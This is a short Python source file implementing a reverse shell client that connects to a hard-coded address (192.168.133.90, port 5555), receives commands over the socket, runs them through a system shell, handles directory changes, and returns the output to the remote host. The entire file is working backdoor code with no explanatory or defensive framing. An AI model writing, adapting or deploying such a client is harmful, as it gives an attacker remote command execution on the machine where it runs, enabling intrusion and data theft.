import socket
import os
import subprocess

class Client:
    def Cprint(self, ToBePrinted):
        print(ToBePrinted)
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.BUFF = 1024
        self.utf8 = "utf-8"

        self.socket = socket.socket()
        self.socket.connect((self.host, self.port))

        while True:
            self.commands = self.socket.recv(self.BUFF).decode(self.utf8)
            if self.commands[:2] == 'cd':
                self.Cprint("Tryed To Change Dir To " + str(self.commands[3:]))
                try:
                    os.chdir(self.commands[3:])
                    self.socket.send(str.encode("\n" + os.getcwd() + "> "))
                except:
                    self.socket.send(str.encode("Path Does Not Exists" + "\n" + os.getcwd() + "> "))
            elif len(str.encode(self.commands)) > 0:
                self.output = subprocess.Popen(self.commands[:], shell=True, stderr= subprocess.PIPE, stdout= subprocess.PIPE, stdin= subprocess.PIPE)
                self.result = self.output.stdout.read() + self.output.stderr.read()
                self.result = str(self.result, self.utf8)
                self.socket.send(str.encode(self.result + "\n" + os.getcwd() + "> "))

Client('192.168.133.90', 5555)